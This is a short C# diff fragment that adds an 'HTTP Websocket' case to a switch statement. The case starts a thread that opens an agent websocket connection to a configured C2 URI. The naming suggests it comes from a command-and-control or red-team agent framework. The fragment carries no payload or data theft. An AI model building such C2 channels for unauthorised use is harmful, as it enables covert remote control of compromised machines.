@@ -1,0 +1,17 @@
+                    case "HTTP Websocket":
+                        try
+                        {
+                            Thread t = new Thread(() =>
+                            {
+                                Console.WriteLine("Starting the Websocket connection for {0}", c.Value.C2URI);
+                                AgentWebsocketSocket ws = new AgentWebsocketSocket(c.Value);
+                                ws.Start();
+                            });
+                            t.Start();
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("Websocket for {0} is failed: {1}", c.Value.C2URI, e);
+                        }
+                        break;
+
